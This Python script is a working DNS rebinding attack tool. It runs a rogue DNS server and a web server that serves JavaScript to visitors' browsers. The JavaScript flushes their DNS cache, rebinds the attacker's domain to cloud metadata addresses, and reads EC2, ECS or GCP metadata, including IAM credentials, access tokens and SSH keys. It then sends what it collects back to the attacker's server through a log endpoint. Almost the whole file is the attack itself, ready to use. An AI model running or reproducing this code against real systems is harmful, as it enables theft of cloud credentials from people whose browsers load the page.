#!/usr/bin/env python3
"""
DNS Rebinding Attack Tool
Updated for Python 3 compatibility and modern security testing
"""

import sys
import time
import threading
import socketserver
import struct
import logging
from dnslib import *

from flask import Flask, request
from flask_cors import CORS, cross_origin
from time import sleep

class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)

def print_usage():
    print('Usage: httprebind.py domain.name serverIp (ec2|ecs|gcloud)', file=sys.stderr)
    print('Example: python3 httprebind.py myrebinding.com 77.77.77.77 ec2', file=sys.stderr)
    sys.exit(1)

if len(sys.argv) < 4:
    print_usage()

base = sys.argv[1]
serverIp = sys.argv[2]
mode = sys.argv[3]

if mode not in ['ec2', 'ecs', 'gcloud']:
    print(f'Error: Invalid mode "{mode}". Must be one of: ec2, ecs, gcloud', file=sys.stderr)
    print_usage()

D = DomainName(base + '.')
IP = serverIp
TTL = 0

# DNS Records configuration
soa_record = SOA(
    mname=D.ns1,  # primary name server
    rname=D.admin,  # email of the domain administrator (changed from 'daeken')
    times=(
        2025010101,  # serial number (updated)
        0,  # refresh
        0,  # retry
        0,  # expire
        0,  # minimum
    )
)

ns_records = [NS(D.ns1), NS(D.ns2)]

records = {
    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
    D.ns1: [A(IP)],
    D.ns2: [A(IP)], 
    D.ex.bc: [A(IP)], 
    D.ex: [A(IP)], 
}

# Pre-generate subdomains for DNS cache poisoning
base_domain = D.ex
for i in range(2500):  # Updated from xrange to range
    records[getattr(base_domain, f'a{i}')] = [A(IP)]

def dns_response(data):
    try:
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    except Exception as e:
        print(f'DNS parsing error: {e}', file=sys.stderr)
        return b''  # Return bytes instead of string

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    
    if base in str(qname) and not str(qname).startswith('a'):
        print(f'DNS request for: {str(qname).strip(".")}')

    if qn == D or qn.endswith('.' + D):
        for name, rrs in records.items():
            if name == qn:
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:
                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))

        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    return reply.pack()

class BaseRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            response = dns_response(self.get_data())
            if response:
                self.send_data(response)
        except Exception as e:
            print(f'DNS handler error: {e}', file=sys.stderr)

class TCPRequestHandler(BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(8192)
        if len(data) < 2:
            raise Exception('TCP packet too short')
        sz = struct.unpack('>H', data[:2])[0]
        if sz != len(data) - 2:
            raise Exception('Wrong size of TCP packet')
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)

class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

# Flask application setup
app = Flask(__name__)
CORS(app)

# Suppress Flask's default logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# JavaScript payload template
boilerplate = '''<!DOCTYPE html>
<html>
<head>
    <title>DNS Rebinding Test</title>
    <meta charset="utf-8">
</head>
<body>
<img src="/loaded" style="display:none;">
<div id="status">Initializing DNS rebinding attack...</div>
<div id="results"></div>
<script>
var backchannelServer = 'bc.$BASE$';
var attackServer = '$BASE$';

function updateStatus(msg) {
    document.getElementById('status').innerHTML = msg;
    console.log(msg);
}

function addResult(data) {
    var div = document.createElement('div');
    div.innerHTML = '<pre>' + data + '</pre>';
    document.getElementById('results').appendChild(div);
}

function log(data) {
    try {
        var sreq = new XMLHttpRequest();
        sreq.open('GET', 'http://' + backchannelServer + '/log?msg=' + encodeURIComponent(data), false);
        sreq.send();
    } catch(e) {
        console.error('Logging failed:', e);
    }
}

function get(url, exp) {
    try {
        var req = new XMLHttpRequest();
        req.open('GET', url, false);
        req.setRequestHeader('X-Google-Metadata-Request', 'True');
        req.timeout = 5000;
        req.send(null);
        if(req.status == 200)
            return req.responseText;
        else
            return '[failed status=' + req.status + ']';
    } catch(err) {
        if(exp !== false) {
            log('Error: ' + err.toString());
        }
    }
    return null;
}

updateStatus('Starting DNS rebinding attack...');
log('Starting...');

var req = new XMLHttpRequest();
req.open('GET', 'http://' + backchannelServer + '/rebind', false);
req.send();

var reqs = [];
var dnsFlush = 2500;
updateStatus('Flushing DNS cache with ' + dnsFlush + ' requests...');
log('Flushing DNS');

for(var i = 0; i < dnsFlush; ++i) {
    var req = reqs[i] = new XMLHttpRequest();
    req.open('GET', 'https://a' + i + '.ex.$BASE$/', true);
    req.send(null);
}

var checkInterval = setInterval(function() {
    var hit = 0;
    for(var i = 0; i < dnsFlush; ++i) {
        if(reqs[i].readyState == 0)
            break;
        hit++;
    }
    if(hit == dnsFlush) {
        clearInterval(checkInterval);
        updateStatus('DNS cache flushed, starting metadata requests...');
        log('DNS Flushed');
        setTimeout(function() {
            $PAYLOAD_CODE$
        }, 1000);
    }
}, 100);
</script>
</body>
</html>'''.replace('$BASE$', base)

# Payload code for different cloud providers
ec2_payload = '''
var role;
updateStatus('Attempting to access EC2 metadata...');
for(var i = 0; i < 60; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();
    
    role = get('http://' + attackServer + '/latest/meta-data/iam/security-credentials/');
    if(role && role != 'still the same host') {
        updateStatus('Successfully accessed EC2 metadata!');
        log('Role: ' + role);
        addResult('IAM Role: ' + role);
        
        var creds = get('http://' + attackServer + '/latest/meta-data/iam/security-credentials/' + role);
        log('Security credentials: ' + creds);
        addResult('Security Credentials: ' + creds);
        
        var ami = get('http://' + attackServer + '/latest/meta-data/ami-id');
        log('AMI id: ' + ami);
        addResult('AMI ID: ' + ami);
        
        var instance_id = get('http://' + attackServer + '/latest/meta-data/instance-id');
        if(instance_id) {
            addResult('Instance ID: ' + instance_id);
        }
        break;
    }
    updateStatus('Waiting for DNS rebinding... attempt ' + (i+1) + '/60');
}
if(!role || role == 'still the same host') {
    updateStatus('DNS rebinding failed or no EC2 metadata available');
}
'''

ecs_payload = '''
var meta;
updateStatus('Attempting to access ECS metadata...');
for(var i = 0; i < 60; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();
    
    meta = get('http://' + attackServer + '/v2/metadata');
    if(meta && meta != 'still the same host') {
        updateStatus('Successfully accessed ECS metadata!');
        log('Meta: ' + meta);
        addResult('ECS Metadata: ' + meta);
        
        var credentials = get('http://' + attackServer + '/v2/credentials');
        if(credentials) {
            log('ECS Credentials: ' + credentials);
            addResult('ECS Credentials: ' + credentials);
        }
        break;
    }
    updateStatus('Waiting for DNS rebinding... attempt ' + (i+1) + '/60');
}
if(!meta || meta == 'still the same host') {
    updateStatus('DNS rebinding failed or no ECS metadata available');
}
'''

gcloud_payload = '''
var sshkeys;
updateStatus('Attempting to access GCP metadata...');
for(var i = 0; i < 60; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();
    
    var hostname = get('http://' + attackServer + '/computeMetadata/v1/instance/hostname');
    if(hostname && hostname != 'still the same host') {
        updateStatus('Successfully accessed GCP metadata!');
        log('Hostname: ' + hostname);
        addResult('Hostname: ' + hostname);
        
        var token = get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/default/token');
        if(token) {
            log('Access token: ' + token);
            addResult('Access Token: ' + token);
        }
        
        sshkeys = get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json');
        if(sshkeys) {
            log('SSH keys: ' + sshkeys);
            addResult('SSH Keys: ' + sshkeys);
        }
        break;
    }
    updateStatus('Waiting for DNS rebinding... attempt ' + (i+1) + '/60');
}
if(!sshkeys) {
    updateStatus('DNS rebinding failed or no GCP metadata available');
}
'''

@app.route('/')
def index():
    payload_map = {
        'ec2': ec2_payload,
        'ecs': ecs_payload,
        'gcloud': gcloud_payload
    }
    
    payload_code = payload_map.get(mode)
    if not payload_code:
        return 'Invalid mode', 400
    
    return boilerplate.replace('$PAYLOAD_CODE$', payload_code)

waits = 0
@app.route('/wait')
@cross_origin()
def wait():
    global waits
    waits += 1
    print(f'Wait {waits}')
    sleep(1)
    return 'waited'

@app.route('/log')
@cross_origin()
def log():
    msg = request.args.get('msg', 'No message')
    print(f'[LOG] {msg}')
    return 'logged'

@app.route('/rebind')
@cross_origin()
def rebind():
    print('Rebound DNS - switching to metadata server IP')
    if mode == 'ecs':
        records[D.ex][0] = A('169.254.170.2')  # ECS metadata endpoint
        print('DNS rebound to ECS metadata IP: 169.254.170.2')
    else:
        records[D.ex][0] = A('169.254.169.254')  # EC2/GCP metadata endpoint
        print('DNS rebound to metadata IP: 169.254.169.254')
    return 'rebound'

@app.route('/loaded')
def loaded():
    print('Page loaded successfully')
    return 'loaded'

# Catch-all routes for metadata endpoints
@app.route('/latest/<path:subpath>')
@app.route('/computeMetadata/<path:subpath>')
@app.route('/v2/<path:subpath>')
def metadata_catchall(subpath=None):
    return 'still the same host'

def main():
    print(f'Starting DNS Rebinding server for {base} on {serverIp} (mode: {mode})')
    
    port = 53
    servers = [
        socketserver.ThreadingUDPServer(('', port), UDPRequestHandler).serve_forever, 
        socketserver.ThreadingTCPServer(('', port), TCPRequestHandler).serve_forever, 
        lambda: app.run(host='0.0.0.0', port=80, debug=False)
    ]
    
    print('Starting DNS servers (UDP/TCP on port 53) and HTTP server (port 80)...')
    
    for s in servers:
        thread = threading.Thread(target=s)
        thread.daemon = True
        thread.start()

    print('All servers started. Press Ctrl+C to stop.')
    
    try:
        while True:
            time.sleep(0.1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        print('\nShutting down servers...')
    finally:
        sys.exit(0)

if __name__ == '__main__':
    main()
